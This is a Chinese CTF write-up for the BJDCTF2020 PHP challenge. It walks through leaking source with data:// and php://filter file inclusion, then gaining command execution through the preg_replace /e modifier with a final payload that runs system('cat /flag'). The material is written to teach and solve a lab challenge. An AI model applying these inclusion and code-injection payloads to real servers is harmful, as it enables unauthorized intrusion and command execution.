---
title: BJDCTF2020-ZJCTF不过如此
date: 2025-03-21 19:04:56
tags:
- php特性
- ${phpinfo()}
category:
- 刷题笔记
---

# BJDCTF2020-ZJCTF不过如此

1、首先打开靶机就是源码

```
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

这里很明显要我们去包含next.php然后查看其中的源码，和之前那题很像也是两个传参，还是用data://伪协议去绕过file_get_contents函数

2、get方法传值

```
?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

回显出一行base64编码字符串

```
PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
```

然后我们将其解码之后就是这样

```
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```

3、代码审计

这里很明显要去利用getFlag函数去命令执行拿到flag，要使用该函数只能利用echo complex($re,$str)这条语句

这里解题的关键就是`preg_replace()+/e`存在代码执行漏洞

```
preg_replace (正则表达式, 替换成什么, 目标字符串, 最大替换次数【默认-1，无数次】, 替换次数)
```

意思就是就是把（目标字符串） 根据（正则表达的要求） 替换成什么

在此之前说明一些东西

---

**双引号：**

```
<?php
echo "{${phpinfo()}}";
?>
```

能成功执行phpinfo()函数并回显

**单引号：**

```
<?php
echo '{${phpinfo()}}';
?>
```

无法执行，没有回显

**这是因为双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。**

**注意：双引号中的函数不会被执行和替换**

---

再看一个例子：

```
<?php
preg_replace('/(.*)/ei', 'strtolower("\\1")', ${phpinfo()});
?>
```

成功执行phpinfo()函数。

## 原理：

**反向引用**
**对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，**
**所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。**
**缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，**
**其中 n 为一个标识特定缓冲区的一位或两位十进制数。**

---

**\1 实际上指定的是第一个子匹配项。而这段代码里面的第一个子匹配项就是${phpinfo()}。这样我们就执行了phpinfo。**

**/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）**

**因此可以通过preg_replace 的 /e 修正符会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行**

**其中在正则表达式中，/(.\*)/ei 是一个匹配任意字符（.）零次或多次（*），并将匹配的内容放入一个捕获组中的正则表达式。**



这里的/e修饰符会将preg_replace中的replacement即`strtolower("\\1")`当做PHP代码，参数则是引用匹配到的字符串。

再实验一下。

```
<?php


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
    echo '1';
}

echo strtolower("${getFlag()}");
```

成功输出1，说明getFlag函数成功执行。

所以我们构造payload：

```
?.*=${getflag()}&cmd=system('cat /flag');
```

发现没有看到flag。

这是因为.是非法传参，会被转为下划线_，所以我们可以把`.*`换成`\S*`表示匹配所有的非空白字符

最终payload：

```
next.php?\S*=${getflag()}&cmd=system('cat /flag');
```

---

## 知识点：

这题主要涉及到这几个知识点

### ${phpinfo()}

在双引号下的"${phpinfo()}"，这里phpinfo()换成其他函数都行，这里的{phpinfo()}就成了一个变量

双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。

所以这样就能成功执行其中的函数。

例如

```
echo strtolower("${getFlag()}");
```

---

### preg_replace、/e

preg_replace语法：

```
preg_replace($pattren,replacement,$string)
```

如果pattren正则匹配后加了/e后缀，就会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行

---

### 反向引用

在正则中\1 实际上指定的是第一个子匹配项。

比如

```
preg_replace('/(.*)/ei', 'strtolower("\\1")', ${phpinfo()});
```

这段代码里面的第一个子匹配项就是${phpinfo()}。因为`.*`是匹配任意字符（`.`）零次或多次（`*`）

这样我们就执行了phpinfo。
